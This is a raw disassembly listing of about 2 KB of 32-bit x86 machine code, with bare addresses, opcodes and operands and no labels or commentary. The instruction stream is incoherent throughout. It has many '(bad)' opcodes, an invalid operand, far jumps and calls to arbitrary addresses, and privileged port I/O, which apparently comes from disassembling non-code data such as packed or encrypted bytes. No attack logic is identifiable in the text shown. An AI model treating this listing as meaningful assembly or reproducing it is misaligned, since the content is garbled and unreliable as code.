  436dbd:	ins    BYTE PTR es:[edi],dx
  436dbe:	test   ecx,0xfa3339f3
  436dc4:	add    bl,bl
  436dc6:	mov    ecx,0x6763ad08
  436dcb:	add    BYTE PTR [ebp-0x4d78a594],al
  436dd1:	push   ebp
  436dd2:	pop    eax
  436dd3:	or     BYTE PTR [ebx+0x4e],0x6b
  436dd7:	mov    ebp,0x7b0845f4
  436ddc:	mov    ebp,0xc6cbf09d
  436de1:	and    BYTE PTR [edi+0x4],bh
  436de4:	push   ebx
  436de5:	fldcw  WORD PTR [esi]
  436de7:	jle    0x436dd5
  436de9:	bound  esi,QWORD PTR [esp+eax*1+0x0]
  436ded:	shl    BYTE PTR [ebx+edx*8+0x51],1
  436df1:	jmp    0x12fa3e17
  436df6:	jno    0x436d8c
  436df8:	cmp    edx,0xfdf91d51
  436dfe:	stc    
  436dff:	mov    esi,0xf9b2df07
  436e04:	add    BYTE PTR [eax],dh
  436e06:	mov    dl,0x55
  436e08:	scas   al,BYTE PTR es:[edi]
  436e09:	bound  esi,QWORD PTR [edx+0x4]
  436e0c:	mov    eax,DWORD PTR [eax]
  436e0e:	out    dx,eax
  436e0f:	jb     0x436e77
  436e11:	stc    
  436e12:	aad    0xda
  436e14:	mov    ?,WORD PTR [eax+0x437bdfcd]
  436e1a:	xchg   esp,eax
  436e1b:	repz sar ebx,0xbd
  436e1f:	jge    0x436e25
  436e21:	add    dl,ah
  436e23:	jb     0x436df9
  436e25:	sub    al,0xa2
  436e27:	fldenv [ecx]
  436e29:	leave  
  436e2a:	pop    ebp
  436e2b:	push   esi
  436e2c:	and    eax,0xaa6e6b70
  436e31:	xor    ch,BYTE PTR [edi-0x70bc94e4]
  436e37:	sbb    BYTE PTR [ebx],bl
  436e39:	fadd   QWORD PTR [ebp-0x16bc1578]
  436e3f:	pop    ds
  436e40:	fcmovbe st,st(3)
  436e42:	jge    0x436eb6
  436e44:	mov    ah,0x6e
  436e46:	imul   ebx,DWORD PTR [ebp-0x56],0xfffffff7
  436e4a:	adc    dl,BYTE PTR [esi+0x1d]
  436e4d:	je     0x436e01
  436e4f:	push   esi
  436e50:	sbb    eax,0x92c44a70
  436e55:	outs   dx,BYTE PTR ds:[esi]
  436e56:	dec    ebx
  436e57:	pop    ebp
  436e58:	stos   BYTE PTR es:[edi],al
  436e59:	mul    DWORD PTR [edx-0x70900aac]
  436e5f:	cdq    
  436e60:	mov    cl,0xc8
  436e62:	xor    DWORD PTR [eax],edx
  436e64:	loope  0x436dea
  436e66:	test   eax,0x6203ea89
  436e6b:	sbb    esp,ebx
  436e6d:	or     DWORD PTR [edx+0x80ba29],esi
  436e73:	test   eax,0x16e94285
  436e78:	mov    BYTE PTR [edi],bh
  436e7a:	xchg   DWORD PTR [edx],esp
  436e7c:	or     eax,0xedfad6fd
  436e81:	sub    eax,0x5cd9a214
  436e86:	inc    ebx
  436e87:	jbe    0x436e6c
  436e89:	jb     0x436e63
  436e8b:	call   FWORD PTR [ebx-0x5b]
  436e8e:	outs   dx,DWORD PTR ds:[esi]
  436e8f:	fist   DWORD PTR [ebx+0x1f]
  436e92:	pop    ebx
  436e93:	call   0xe1b173e6
  436e98:	cwde   
  436e99:	jne    0x436ebb
  436e9b:	xor    dl,BYTE PTR [eax+ebp*1+0x5b]
  436e9f:	test   cl,bl
  436ea1:	add    cl,ch
  436ea3:	popa   
  436ea4:	mov    bh,0xdb
  436ea6:	pop    esp
  436ea7:	mov    ds:0x3858e983,al
  436eac:	cmp    al,0xa3
  436eaf:	cmp    al,0x88
  436eb1:	clc    
  436eb2:	jmp    0xcf44c2cb
  436eb7:	inc    DWORD PTR [ecx-0x379e1741]
  436ebd:	dec    edx
  436ebe:	xor    al,0x9
  436ec0:	pop    edi
  436ec1:	les    edx,FWORD PTR [esi]
  436ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436ec4:	sub    al,0xca
  436ec6:	stos   DWORD PTR es:[edi],eax
  436ec7:	pop    edx
  436ec8:	(bad)  [ecx-0x26819dd1]
  436ece:	xor    al,0xdb
  436ed0:	jne    0x436e54
  436ed2:	test   edx,ebx
  436ed4:	xchg   al,bh
  436ed6:	jmp    0x8c6ca0db
  436edb:	js     0x436ec0
  436edd:	add    eax,DWORD PTR ds:0x8b2335e9
  436ee3:	adc    al,0x36
  436ee5:	pop    ebx
  436ee6:	fdivr  st(4),st
  436ee8:	jns    0x436f3c
  436eea:	xchg   cl,bh
  436eec:	mov    bh,0x80
  436eee:	clc    
  436eef:	push   ecx
  436ef0:	int3   
  436ef1:	dec    eax
  436ef2:	clc    
  436ef3:	push   esi
  436ef4:	jecxz  0x436ef8
  436ef6:	fucomi st,st(1)
  436ef8:	push   ss
  436ef9:	fld    DWORD PTR [ebx+0x6ed9afc4]
  436eff:	out    dx,al
  436f00:	jp     0x436f15
  436f02:	add    eax,0x51a91d64
  436f07:	cdq    
  436f08:	adc    DWORD PTR [edi],edx
  436f0a:	jmp    0xf8c3e3a0
  436f0f:	pusha  
  436f10:	cmp    al,0x86
  436f12:	clc    
  436f13:	jmp    0xf54c96c
  436f18:	aas    
  436f19:	cmp    BYTE PTR [edi+0x40dabb00],0x49
  436f20:	ss repz jge 0x436f72
  436f24:	mov    edi,0xc574c05f
  436f29:	stos   DWORD PTR es:[edi],eax
  436f2a:	loopne 0x436efc
  436f2c:	(bad)  
  436f2d:	idiv   ecx
  436f2f:	and    DWORD PTR ds:0xd08400d9,0xffffff8e
  436f36:	add    BYTE PTR [ebp-0x17171293],cl
  436f3c:	add    BYTE PTR [esi+0x4d8bf9f5],bl
  436f42:	test   DWORD PTR [ebx-0x1f7dc837],eax
  436f48:	jmp    0x8555:0x83f9f48d
  436f4f:	clc    
  436f50:	pop    ebp
  436f51:	mov    al,ds:0x4b04b6c2
  436f56:	scas   eax,DWORD PTR es:[edi]
  436f57:	jge    0x436f45
  436f59:	mov    edx,0x3b021526
  436f5e:	fisub  DWORD PTR ds:0x51af58c0
  436f64:	mov    esi,DWORD PTR [edx-0x411573f9]
  436f6a:	cmc    
  436f6b:	stc    
  436f6c:	mov    esp,esi
  436f6e:	cmp    DWORD PTR [edi+0x47],0x1072070f
  436f75:	mov    ds:0x9cffb1b0,eax
  436f7a:	pop    es
  436f7b:	cdq    
  436f7c:	mov    dl,0xfa
  436f7e:	fld    DWORD PTR [eax]
  436f80:	mov    esi,DWORD PTR [eax]
  436f82:	and    cl,dh
  436f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436f85:	sub    eax,0xb3c083f5
  436f8a:	popf   
  436f8b:	pop    esi
  436f8c:	adc    al,0x6e
  436f8e:	inc    edi
  436f8f:	rcl    BYTE PTR [ecx+0x1b],1
  436f92:	test   eax,0x4362db25
  436f97:	sar    eax,1
  436f99:	ja     0x436f83
  436f9b:	adc    al,BYTE PTR [eax+0x62]
  436f9e:	cmc    
  436f9f:	inc    ebx
  436fa0:	jp     0x436fa2
  436fa2:	jb     0x437002
  436fa4:	sub    ebx,DWORD PTR [edi+ebx*1-0x1a]
  436fa8:	out    dx,eax
  436fa9:	or     esp,ecx
  436fab:	xchg   DWORD PTR [edi],ecx
  436fad:	jnp    0x43702d
  436faf:	jecxz  0x436fe6
  436fb1:	(bad)  
  436fb2:	jmp    0x436f67
  436fb4:	rcl    edi,0xe7
  436fb7:	mov    ah,0x44
  436fb9:	push   eax
  436fba:	enter  0xdb13,0x43
  436fbe:	bound  ecx,QWORD PTR [ebx]
  436fc0:	cmp    ebp,eax
  436fc2:	fdiv   QWORD PTR [edi+0x2fdff969]
  436fc8:	cld    
  436fc9:	xchg   edx,eax
  436fca:	mov    ds:0x5b733cfb,al
  436fcf:	imul   edi,edi,0x2c
  436fd2:	cmp    DWORD PTR [eax+0x74eb6244],esp
  436fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436fd9:	jmp    0x68df:0x8b047263
  436fe0:	push   0xfffffff9
  436fe2:	cmp    eax,0xab40050b
  436fe7:	test   DWORD PTR [esi-0x7b],esp
  436fea:	and    eax,0x1b54cad4
  436fef:	mov    al,0xd1
  436ff1:	test   BYTE PTR [esi],cl
  436ff3:	lock pusha 
  436ff5:	clc    
  436ff6:	jecxz  0x437016
  436ff8:	imul   edi,edi,0x84cf730d
  436ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436fff:	mov    dl,dl
  437001:	sub    al,0xf4
  437003:	imul   esi,DWORD PTR [edi-0x9],0x0
  437007:	jmp    0x43704f
  437009:	sbb    BYTE PTR [edi+eiz*8],cl
  43700c:	out    0xf0,eax
  43700e:	std    
  43700f:	inc    edx
  437010:	(bad)  
  437012:	fstp   st(5)
  437014:	jl     0x437046
  437016:	imul   ebx,ebx,0x5b446684
  43701c:	pop    ebp
  43701d:	push   0x6cd96204
  437022:	mov    eax,0xc01fe181
  437027:	sub    ecx,0x4be55be9
  43702d:	out    0x6a,eax
  43702f:	fist   WORD PTR [esi+ebp*8]
  437032:	pop    ebx
  437033:	jl     0x437080
  437035:	aad    0x6a
  437037:	ficomp WORD PTR [ecx+0x14e6e056]
  43703d:	(bad)  
  43703e:	js     0x43701e
  437040:	mov    ebp,0xd9620391
  437045:	sbb    DWORD PTR [ecx+0x1e],edi
  437048:	mov    ebp,0x6e85d3d9
  43704d:	jo     0x4370b7
  43704f:	imul   edx,DWORD PTR [eax+0x16],0x20
  437053:	outs   dx,BYTE PTR ds:[esi]
  437054:	pop    ebp
  437055:	stos   BYTE PTR es:[edi],al
  437056:	out    dx,eax
  437057:	mov    ds:0x76201e56,al
  43705c:	push   edx
  43705d:	push   cs
  43705e:	and    BYTE PTR [esi+0x71],ch
  437061:	mov    bh,0x2e
  437063:	cmp    BYTE PTR [esi+ebx*2+0x64dfb143],al
  43706a:	jno    0x43706c
  43706c:	mov    dh,0xd3
  43706e:	(bad)  
  43706f:	stc    
  437070:	cmp    eax,0x1b6a95d1
  437075:	push   eax
  437076:	sub    BYTE PTR [ebx+0x15],bl
  437079:	dec    eax
  43707a:	dec    edi
  43707b:	push   0x3f
  43707d:	mov    esp,DWORD PTR [ecx-0x11]
  437080:	inc    ecx
  437081:	aad    0x52
  437083:	and    al,0xe1
  437085:	lahf   
  437086:	scas   al,BYTE PTR es:[edi]
  437087:	sti    
  437088:	ficomp WORD PTR [ebx]
  43708a:	add    ebp,esp
  43708c:	ins    BYTE PTR es:[edi],dx
  43708d:	sbb    DWORD PTR [ecx],ebp
  43708f:	pusha  
  437090:	pop    esp
  437091:	pop    esi
  437092:	dec    eax
  437093:	cmc    
  437094:	pop    esp
  437095:	les    ecx,FWORD PTR [eax]
  437097:	jo     0x4370f9
  437099:	pop    esi
  43709a:	inc    edx
  43709b:	in     eax,0x4e
  43709d:	sbb    bh,ch
  43709f:	add    DWORD PTR [edx-0x69],esp
  4370a2:	cmp    eax,0xf78451cd
  4370a7:	jne    0x4370fe
  4370a9:	jmp    0xb74c9739
  4370ae:	imul   dh
  4370b0:	cmp    ecx,DWORD PTR [edi+eiz*8-0x18]
  4370b4:	popa   
  4370b5:	fld    DWORD PTR [ebp-0x411ebddb]
  4370bb:	jmp    0x548d8a21
  4370c0:	stc    
  4370c1:	and    DWORD PTR [edi+ebp*4-0x3b73d358],ecx
  4370c8:	popf   
  4370c9:	inc    ebp
  4370ca:	std    
  4370cb:	call   0x6b28cd6c
  4370d0:	add    BYTE PTR [edx],al
  4370d2:	add    DWORD PTR [ebp+edx*4+0x364f148a],0x27e98ad4
  4370dd:	out    0x7f,al
  4370df:	clc    
  4370e0:	bound  eax,QWORD PTR [esi-0x3786e28f]
  4370e6:	or     BYTE PTR [ecx+edi*2+0x6d0887b5],0x87
  4370ee:	cmp    al,0xe9
  4370f1:	lods   al,BYTE PTR ds:[esi]
  4370f2:	adc    eax,0xd98f91d
  4370f7:	sbb    eax,0x3b62b9f9
  4370fc:	push   edi
  4370fd:	jnp    0x43715c
  4370ff:	rcr    esi,0x85
  437102:	test   DWORD PTR [ecx],eax
  437104:	add    BYTE PTR [ebx],cl
  437106:	xlat   BYTE PTR ds:[ebx]
  437107:	mov    ecx,DWORD PTR [edi+ebx*2-0x47]
  43710b:	call   0xfa3461ac
  437110:	lea    edi,[edi-0x5595e31e]
  437116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437117:	inc    edi
  437118:	push   0xfffffff3
  43711a:	add    eax,0x246ee8cb
  43711f:	sti    
  437120:	(bad)  
  437121:	aas    
  437122:	sbb    eax,0xdd81840a
  437127:	add    BYTE PTR [eax],al
  437129:	inc    esi
  43712a:	inc    ecx
  43712b:	and    al,0x10
  43712d:	arpl   bp,si
  43712f:	cs (bad) 
  437131:	mov    ah,0x2
  437133:	ror    DWORD PTR [edi],0x0
  437136:	movsx  eax,WORD PTR [eax]
  437139:	add    BYTE PTR [ebx-0x70dbbaf5],cl
  43713f:	push   ds
  437140:	push   es
  437141:	ds xchg ebp,eax
  437143:	icebp  
  437144:	mov    eax,DWORD PTR [edi+ebp*2-0x17]
  437148:	pop    esi
  437149:	or     eax,0x6d5ea65b
  43714e:	add    al,al
  437150:	call   0xfa341217
  437155:	test   BYTE PTR [ebx],cl
  437157:	add    DWORD PTR [edi+eiz*4-0x72ff29b5],0xe810b987
  437162:	adc    dl,BYTE PTR [esi-0x114f0006]
  437168:	cmp    edi,0x2f
  43716b:	(bad)  
  43716d:	je     0x43718e
  43716f:	out    0x51,al
  437171:	push   ecx
  437172:	popa   
  437173:	mov    al,ds:0x5ab3ce7d
  437178:	fdivp  st(6),st
  43717a:	mov    ah,0x5
  43717c:	retf   0x628a
  43717f:	enter  0xfb5b,0xd0
  437183:	adc    ch,BYTE PTR [ecx-0x7c]
  437186:	sbb    DWORD PTR [eax+eiz*8-0x7d],eax
  43718a:	cmc    
  43718b:	jb     0x437205
  43718d:	test   BYTE PTR [edx+0x70],ah
  437190:	add    al,0x8b
  437192:	xchg   esi,eax
  437193:	fmul   QWORD PTR [eax+ebp*8]
  437196:	push   ebx
  437197:	jp     0x437203
  437199:	stc    
  43719a:	add    cl,ch
  43719c:	mov    bh,0x76
  43719e:	stc    
  43719f:	push   esi
  4371a0:	mov    WORD PTR [ecx+0x74],gs
  4371a3:	jle    0x437125
  4371a5:	ror    DWORD PTR [esi+0x48],1
  4371a8:	push   0x75
  4371aa:	retf   0x68ca
  4371ad:	push   ebp
  4371ae:	cli    
  4371af:	lods   eax,DWORD PTR ds:[esi]
  4371b0:	idiv   BYTE PTR [eax]
  4371b2:	xchg   BYTE PTR [edx-0x6251ca29],cl
  4371b8:	jp     0x43713b
  4371ba:	aad    0xe
  4371bc:	leave  
  4371bd:	jns    0x43720b
  4371bf:	inc    esi
  4371c0:	test   BYTE PTR [edi+edx*8+0x20],bl
  4371c4:	xchg   edx,eax
  4371c5:	pusha  
  4371c6:	mov    esp,DWORD PTR [esi]
  4371c8:	aam    0x10
  4371ca:	push   dx
  4371cc:	loopne 0x43719b
  4371ce:	repnz imul BYTE PTR gs:[esi]
  4371d2:	call   0xf9a308f7
  4371d7:	out    0x32,al
  4371d9:	icebp  
  4371da:	and    al,0xe7
  4371dc:	scas   al,BYTE PTR es:[edi]
  4371dd:	and    BYTE PTR [eax],dl
  4371df:	cmp    dh,dh
  4371e1:	ret    
  4371e2:	stc    
  4371e3:	inc    ebp
  4371e4:	cld    
  4371e5:	cmp    DWORD PTR fs:0xaef9107f,0xffffff96
  4371ed:	adc    al,0x51
  4371ef:	xchg   ebx,eax
  4371f0:	fsub   st(5),st
  4371f2:	test   BYTE PTR [ebx+ebx*2],dl
  4371f5:	sbb    eax,0x5eda1ce5
  4371fa:	jnp    0x437227
  4371fc:	push   esp
  4371fd:	inc    edx
  4371fe:	pop    esp
  4371ff:	add    BYTE PTR [ebp-0x2198b0b5],cl
  437205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437206:	int    0x13
  437208:	out    0xcf,eax
  43720a:	push   ecx
  43720b:	out    dx,al
  43720c:	mov    DWORD PTR [eax+0x72187b37],0x80ebb1bf
  437216:	sti    
  437217:	ins    DWORD PTR es:[edi],dx
  437218:	out    0x97,eax
  43721a:	mov    edi,0xfd542ec5
  43721f:	enter  0x270e,0x63
  437223:	pop    eax
  437224:	inc    edi
  437225:	jne    0x437239
  437227:	test   esi,ecx
  437229:	leave  
  43722a:	in     eax,0x3
  43722c:	bound  ebx,QWORD PTR [edx+0x75]
  43722f:	adc    esp,DWORD PTR [edx-0x27]
  437232:	dec    ecx
  437233:	add    al,0x17
  437235:	push   esp
  437236:	adc    al,0xce
  437238:	in     al,0x1d
  43723a:	push   es
  43723b:	clc    
  43723c:	fmul   QWORD PTR ds:0x5c5b13fe
  437242:	push   ebx
  437243:	add    eax,0x5cc1d962
  437248:	clc    
  437249:	jle    0x43720a
  43724b:	jp     0x4371f7
  43724d:	jno    0x4372c6
  43724f:	push   ebp
  437250:	push   0xe1736380
  437255:	xchg   edi,edx
  437257:	jg     0x43721a
  437259:	fucompp 
  43725b:	add    ebp,ecx
  43725d:	or     al,0xbe
  43725f:	or     esp,ebp
  437261:	add    al,0xc6
  437263:	or     eax,DWORD PTR [eax]
  437265:	cmp    dl,BYTE PTR [edi+0x553b65d1]
  43726b:	stos   BYTE PTR es:[edi],al
  43726c:	mul    cl
  43726e:	sbb    ch,cl
  437270:	add    esp,DWORD PTR [edx+0x4e]
  437273:	add    DWORD PTR ds:0xe7e8e582,esp
  437279:	dec    eax
  43727a:	cmp    eax,0x70
  43727d:	aad    0xbb
  43727f:	adc    al,0x64
  437281:	mov    eax,ds:0xf5561f05
  437286:	mov    ebx,0xf616b90c
  43728b:	fs jb  0x4372bd
  43728e:	jno    0x43721b
  437290:	push   ebx
  437291:	xchg   DWORD PTR [edx-0x22ba5a74],eax
  437297:	mov    dl,BYTE PTR [ecx]
  437299:	cmp    DWORD PTR [eax-0x4e],edi
  43729c:	es cmp al,0x55
  43729f:	fsub   st(6),st
  4372a1:	dec    ebp
  4372a2:	rol    BYTE PTR [ecx],cl
  4372a4:	jmp    0xc598c90a
  4372a9:	mov    ch,0x52
  4372ab:	inc    ebp
  4372ac:	int    0x81
  4372ae:	jno    0x43725b
  4372b0:	mov    ebp,0xad868247
  4372b5:	inc    ebp
  4372b6:	mov    ecx,0xeb1dc6a
  4372bb:	imul   edx,DWORD PTR [ebx+ebx*1-0x6d],0xffffffe9
  4372c0:	inc    eax
  4372c1:	sub    BYTE PTR [ebx-0x2de19208],al
  4372c7:	jl     0x437289
  4372c9:	add    BYTE PTR [esi-0x27],ah
  4372cc:	add    BYTE PTR [ebx+0x62],dl
  4372cf:	icebp  
  4372d0:	xor    al,0x86
  4372d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4372d3:	jg     0x437326
  4372d5:	inc    ebx
  4372d6:	jne    0x43732c
  4372d8:	mov    ecx,0xa6f77526
  4372de:	loop   0x437279
  4372e0:	or     BYTE PTR [ebp-0x4a],ah
  4372e3:	fld    DWORD PTR [eax]
  4372e5:	jmp    0x25c94e15
  4372ea:	and    ch,0x50
  4372ed:	add    BYTE PTR [edx-0x5d],bl
  4372f0:	jb     0x43727d
  4372f2:	std    
  4372f3:	sbb    eax,0xf4adea22
  4372f8:	jl     0x4372ba
  4372fa:	cmp    al,0xff
  4372fc:	mov    cl,0x0
  4372fe:	or     ebx,ebx
  437300:	jne    0x43737f
  437302:	or     ebx,ebx
  437304:	jb     0x43731e
  437306:	lods   al,BYTE PTR ds:[esi]
  437307:	outs   dx,BYTE PTR ds:[esi]
  437308:	or     bh,bh
  43730a:	push   ss
  43730b:	xchg   DWORD PTR [edi+0x6a],eax
  43730e:	mov    ah,0x1
  437310:	retf   
  437311:	call   0x3e9408
  437316:	ja     0x43732d
  437318:	or     al,BYTE PTR [edx+esi*1+0x460000d5]
  43731f:	adc    BYTE PTR [ebp+0x13],ch
  437322:	or     BYTE PTR [esi+ebx*2-0x1738bf97],ch
  437329:	imul   esp,DWORD PTR [ecx-0x9],0xfffffff9
  43732d:	test   BYTE PTR [eax],al
  43732f:	mov    eax,DWORD PTR [esp+eax*4+0xdabb82]
  437336:	sub    DWORD PTR [esi],0xffffff82
  437339:	clc    
  43733a:	jae    0x4372f6
  43733c:	cmc    
  43733d:	jae    0x437347
  43733f:	pop    edx
  437340:	mov    ds:0x22bd8b5e,eax
  437345:	push   ecx
  437346:	jmp    0xa017:0xc07cf5ad
  43734d:	mov    ecx,DWORD PTR [edi+eiz*2-0x3b]
  437351:	fist   DWORD PTR es:[ebx-0x53000b16]
  437358:	pop    es
  437359:	inc    ebp
  43735a:	and    al,0x5b
  43735c:	mov    al,ds:0xefe1e7f7
  437361:	stc    
  437362:	inc    edi
  437364:	sbb    ch,BYTE PTR [ebp+0x34]
  437367:	(bad)  
  437368:	cmc    
  437369:	outs   dx,DWORD PTR ds:[esi]
  43736a:	and    al,0xaa
  43736c:	jb     0x437372
  43736e:	add    BYTE PTR [edx-0x1d],cl
  437371:	mov    cl,0xf9
  437373:	sub    eax,0xa2477ed
  437378:	jb     0x43737e
  43737a:	add    BYTE PTR [edx+0x3e4c79e1],dh
  437380:	sub    al,0xc6
  437382:	out    0x73,eax
  437384:	bound  ebx,QWORD PTR [edi-0x7]
  437387:	fadd   st,st(7)
  437389:	test   eax,0x47063ea
  43738e:	mov    esp,esi
  437390:	retf   
  437391:	mov    ah,0xfd
  437393:	add    ch,ch
  437395:	outs   dx,DWORD PTR ds:[esi]
  437396:	ss jmp ebp
  437399:	xor    BYTE PTR [edx+0x499db72],bh
  43739f:	mov    esp,DWORD PTR [esi]
  4373a1:	mov    WORD PTR [eax],gs
  4373a3:	call   0xf9a02f37
  4373a8:	fnstenv [ebp+0x5c]
  4373ab:	fcomi  st,st(2)
  4373ad:	into   
  4373ae:	pop    esp
  4373af:	test   DWORD PTR [edi+eiz*8+0x7eadb045],esp
  4373b6:	jns    0x437375
  4373b8:	mov    ecx,0x8a0a799f
  4373bd:	mov    edx,0xa95f9b3
  4373c2:	push   ebx
  4373c3:	call   0xf9a7d36e
  4373c8:	push   eax
  4373c9:	xor    bl,al
  4373cb:	push   esp
  4373cc:	jmp    0x67013665
  4373d1:	jo     0x43738c
  4373d3:	test   BYTE PTR [esi-0xe],bh
  4373d6:	jo     0x437424
  4373d8:	xlat   BYTE PTR ds:[ebx]
  4373d9:	mov    ah,0x94
  4373db:	dec    ebp
  4373dc:	mov    ah,0xe3
  4373de:	xchg   DWORD PTR [ebx+0x66],edi
  4373e1:	fst    DWORD PTR [ebx]
  4373e3:	add    eax,0xbb38d4e7
  4373e8:	ja     0x43738a
  4373ea:	(bad)  
  4373eb:	mov    ah,0x8d
  4373ed:	push   esi
  4373ee:	stos   BYTE PTR es:[edi],al
  4373ef:	fstp   DWORD PTR [edi-0x52bbd2b0]
  4373f5:	sub    dl,0x3
  4373f8:	add    BYTE PTR [edx],al
  4373fa:	(bad)  
  4373fc:	and    dl,BYTE PTR [ebp+0x16]
  4373ff:	sahf   
  437400:	(bad)  [edi+0x52]
  437403:	lods   eax,DWORD PTR ds:[esi]
  437404:	psubd  mm5,mm6
  437407:	cdq    
  437408:	arpl   WORD PTR [ebx],cx
  43740a:	push   ecx
  43740b:	pop    edx
  43740c:	mov    eax,esi
  43740e:	add    eax,0x4e638ef6
  437413:	lods   eax,DWORD PTR ds:[esi]
  437414:	setge  BYTE PTR [ebp+ebp*4+0xf]
  437419:	nop
  43741a:	and    al,0x2f
  43741c:	mov    ah,0x69
  43741e:	push   esi
  43741f:	sub    bl,cl
  437421:	data16 jl 0x4373b9
  437424:	movq   QWORD PTR [edi-0x2eae9d50],mm4
  43742b:	add    DWORD PTR ds:0x610f7115,0xffffffbb
  437432:	jl     0x4374a8
  437434:	cmp    al,0xe7
  437436:	mov    edx,DWORD PTR [edx]
  437438:	mov    dh,0xf5
  43743a:	jl     0x43742b
  43743c:	ret    0x4f3b
  43743f:	sub    edi,DWORD PTR [edi+0x3f2979c]
  437445:	xor    DWORD PTR [eax-0x3a],edx
  437448:	xchg   BYTE PTR [esi-0x1b],dh
  43744b:	push   0xffffffe8
  43744d:	jns    0x437428
  43744f:	cmp    dl,BYTE PTR [ecx+0x6319e121]
  437455:	icebp  
  437456:	in     al,0x64
  437458:	mov    eax,0x24014e6d
  43745d:	add    dl,al
  43745f:	jno    0x43743d
  437461:	mov    al,bl
  437463:	cmp    BYTE PTR [esi-0x57],0x35
  437467:	fdiv   DWORD PTR [edx]
  437469:	test   eax,0x2c8c13b4
  43746e:	sahf   
  43746f:	mov    dh,0x3d
  437471:	(bad)  
  437472:	fdivr  st(7),st
  437474:	in     al,0xe9
  437476:	in     al,0xf7
  437478:	in     al,dx
  437479:	jmp    0x7694f5ec
  43747e:	cmp    al,BYTE PTR [eax+0x71921c86]
  437484:	dec    esi
  437485:	rol    BYTE PTR [edx-0x5a53737e],cl
  43748b:	push   ebx
  43748c:	fld    DWORD PTR [ecx-0x7d]
  43748f:	xor    bh,al
  437491:	dec    esi
  437492:	frstor [ebp+0x880df6d]
  437498:	in     eax,dx
  437499:	jb     0x437445
  43749b:	iret   
  43749c:	idiv   DWORD PTR [ebp+ecx*2+0x40e14656]
  4374a3:	or     BYTE PTR [ecx],dl
  4374a5:	adc    edi,esp
  4374a7:	jg     0x4374a1
  4374a9:	push   ds
  4374aa:	xlat   BYTE PTR ds:[ebx]
  4374ab:	mov    al,ds:0x714da48c
  4374b0:	aad    0x3e
  4374b2:	inc    eax
  4374b3:	or     BYTE PTR [ebx-0x3b6d13d6],0x94
  4374ba:	aam    0x6c
  4374bc:	test   BYTE PTR ds:0x964f0c91,al
  4374c2:	add    ah,ah
  4374c4:	push   0x52
  4374c6:	je     0x43749d
  4374c8:	xchg   DWORD PTR [eax+eiz*8+0x64e9a66c],ecx
  4374cf:	push   ds
  4374d0:	cmp    al,0x65
  4374d3:	push   ds
  4374d4:	add    eax,0xa3a40023
  4374d9:	lock test DWORD PTR [ebp+0x44f473f9],ebp
  4374e0:	xchg   ebx,eax
  4374e1:	icebp  
  4374e2:	dec    DWORD PTR [esi+0x71d67dcd]
  4374e8:	ror    DWORD PTR [edi-0x18],cl
  4374eb:	and    al,0x1c
  4374ed:	cli    
  4374ee:	inc    eax
  4374f0:	mov    dh,ah
  4374f2:	mov    dh,bl
  4374f4:	in     eax,dx
  4374f5:	(bad)  
  4374f6:	scas   eax,DWORD PTR es:[edi]
  4374f7:	in     al,0xf8
  4374f9:	pop    ecx
  4374fa:	pop    esi
  4374fb:	mov    cl,0x14
  4374fd:	dec    esi
  4374fe:	leave  
  4374ff:	leave  
  437500:	rol    DWORD PTR [eax],1
  437502:	push   ebp
  437503:	or     BYTE PTR [ecx],0x78
  437506:	in     al,dx
  437507:	psrlq  mm0,QWORD PTR [eax]
  43750a:	add    BYTE PTR [esi+0x52],dh
  43750d:	icebp  
  43750e:	sti    
  43750f:	xchg   esp,eax
  437510:	clc    
  437511:	inc    ebp
  437512:	push   esi
  437513:	lods   al,BYTE PTR ds:[esi]
  437514:	inc    esi
  437515:	pusha  
  437516:	idiv   bl
  437518:	(bad)  
  437519:	add    BYTE PTR [ebx+0x33e84ca1],cl
  43751f:	jo     0x437519
  437521:	adc    esi,DWORD PTR [ecx+edi*4-0x6a]
  437525:	clc    
  437526:	inc    edi
  437527:	add    dh,al
  437529:	and    eax,DWORD PTR [ecx]
  43752b:	add    BYTE PTR [ebx+0x4e8d4da1],bh
  437531:	sbb    eax,0x4564fffc
  437536:	inc    ebp
  437537:	push   0x4131ef
  43753c:	ss push edx
  43753e:	icebp  
  43753f:	sti    
  437540:	xchg   esp,eax
  437541:	stc    
  437542:	push   eax
  437543:	jmp    FWORD PTR [esi+0x7b40063e]
  437549:	push   ebx
  43754a:	shl    DWORD PTR [esi+eiz*2+0x4a],0x8c
  43754f:	clc    
  437550:	bound  esp,QWORD PTR [ebp-0x6875069f]
  437556:	pop    ecx
  437557:	stc    
  437558:	ins    DWORD PTR es:[edi],dx
  437559:	in     al,dx
  43755a:	inc    ebx
  43755b:	je     0x437591
  43755d:	loope  0x4374e6
  43755f:	xchg   ebx,eax
  437560:	pop    edx
  437561:	inc    ebp
  437562:	popa   
  437563:	stc    
  437564:	jmp    0xc3b8e1c2
  437569:	xor    eax,0xe4228461
  43756e:	add    BYTE PTR [ebp-0x7546936c],al
  437574:	out    0x67,eax
  437576:	push   edi
  437577:	stc    
  437578:	sub    eax,0x25f92168
  43757d:	sti    
  43757e:	xchg   BYTE PTR [ebx-0x69efae6],cl
  437584:	call   0x15fae1f0
  437589:	repz pusha 
  43758b:	pop    ecx
  43758c:	add    BYTE PTR [esi+eax*1-0x50d4aac3],ah
  437593:	sub    ah,0x3e
  437596:	outs   dx,BYTE PTR ds:[esi]
  437597:	add    al,0x0
  437599:	xchg   ecx,eax
  43759a:	pop    ebp
  43759b:	mov    edx,0x6bb8d950
  4375a0:	mov    al,ds:0x2d60c259
  4375a5:	mov    al,0x95
  4375a7:	std    
  4375a8:	push   esi
  4375a9:	aad    0xe0
  4375ab:	jl     0x437593
  4375ad:	bound  esp,QWORD PTR [ebp+eax*1+0x46]
  4375b1:	ss ins BYTE PTR es:[edi],dx
  4375b3:	out    0x1,al
  4375b5:	leave  
  4375b6:	jno    0x43759e
  4375b8:	add    edi,DWORD PTR [ecx+0x7fde66d]
  4375be:	popa   
  4375bf:	mov    bl,0x4e
  4375c1:	xor    esi,ebp
  4375c3:	scas   eax,DWORD PTR es:[edi]
  4375c4:	and    eax,DWORD PTR [edi+edi*1+0x4b]
  4375c8:	call   0x5ea14f08
  4375cd:	mov    edi,DWORD PTR [ebx]
  4375cf:	push   esi
  4375d0:	out    dx,al
